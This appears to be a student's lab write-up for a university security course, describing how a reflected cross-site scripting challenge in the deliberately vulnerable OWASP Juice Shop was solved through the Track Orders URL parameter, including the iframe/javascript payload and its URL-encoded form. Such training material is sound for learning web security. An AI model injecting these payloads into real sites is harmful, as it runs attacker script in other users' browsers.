# OWASP Juice Shop — Reflected XSS via URL Parameter

**Date:** 2026-01-13  
**Platform:** OWASP Juice Shop  
**Course:** Computer Security (MSc Cybersecurity, Linköping University)  
**Difficulty:** 2 ⭐  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

---

## Challenge Description

Perform a **reflected XSS attack** using `<iframe src="javascript:alert(`xss`)">`.

---

## How I Solved It

### 1. Logged into the OWASP Juice Shop application

### 2. Navigated to **Account → Orders & Payment → Track Orders**

### 3. Entered a test value (e.g. `test`) in the search field

### 4. Observed that the input was directly reflected in the response page

### 5. Identified the vulnerable URL parameter:
```
/#/track-result?id=test
```

### 6. URL-encoded the XSS payload:

**Original Payload:**
```html
<iframe src="javascript:alert(`xss`)">
```

**Encoded as:**
```
<iframe%20src%3D"javascript:alert(%60xss%60)">
```

### 7. Injected the encoded payload into the id parameter:
```
/#/track-result?id=<iframe%20src%3D"javascript:alert(%60xss%60)">
```

### 8. Opened the crafted URL while logged in

An alert box appeared, confirming successful reflected XSS execution.

---

## Conclusion

Successfully performed a reflected XSS attack by exploiting insufficient input validation in the Track Orders functionality of OWASP Juice Shop.
